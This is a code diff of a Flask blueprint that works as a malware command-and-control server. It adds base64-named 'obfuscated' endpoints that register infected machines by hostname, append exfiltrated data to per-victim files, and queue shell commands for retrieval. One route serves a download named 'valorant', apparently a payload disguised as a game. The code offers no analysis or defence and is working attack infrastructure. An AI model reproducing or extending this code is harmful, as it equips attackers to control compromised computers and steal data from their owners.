@@ -12,7 +12,7 @@ bp = Blueprint('nartan', __name__)
 
 
 STATIC_DIR = os.getcwd()
-EXFIL_DIR = os.getcwd() + "/polo/infected"
+EXFIL_DIR = os.getcwd() + "/polo/infected/"
 CMD_FILE = os.getcwd() + "/polo/cmds.txt"
 
 #Utils
@@ -21,6 +21,8 @@ def get_commands():
     with open(CMD_FILE, "r") as f:
         for line in f.readlines():
             cmds.append(line.strip('\n'))
+
+    open(CMD_FILE,"w").close()
     return json.dumps(cmds)
 
 @bp.route('/')
@@ -39,14 +41,30 @@ def download():
     print("Sending File")
     return send_file(STATIC_DIR + "/marco/static/valorant", as_attachment=True) 
 
+#Obfuscated endpoint for first contact
+@bp.route('/ZGlyawo', methods=['POST'])
+def ZGlyawo():
+    #only thing that should be coming through this endpoint is a string along the lines of this
+    #Marks-iMac.local, vps258357, Mark-PC, etc.
+    post_data = request.get_data().decode('utf-8')
+    path = EXFIL_DIR + post_data
+    if not os.path.isdir(path):
+        os.mkdir(path)
+    print("Made Dir: %s" % (EXFIL_DIR + post_data))
+    return('',204)
+
+
 #Obfuscated endpoint for exfil
 @bp.route('/aGF0c3UK', methods=['POST'])
 def aGF0c3UK():
-    post_data = request.get_data()
-    print(str(post_data.decode('utf-8'))) 
-    #return empty 204
+    post_data = request.get_data().decode('utf-8')
+    dirPath = post_data[0:post_data.find(':')]
+    post_data = post_data[(len(dirPath)+ 1):]
+    with open(EXFIL_DIR + dirPath + "/exfil.info", "a") as f:
+        f.write(post_data + "\n")
     return('', 204)
 
+#Obfuscated endpoint for retrieval
 @bp.route('/R1JOQ2hlZXRhaAo', methods=['GET'])
 def R1JOQ2hlZXRhaAo():
     data = get_commands()
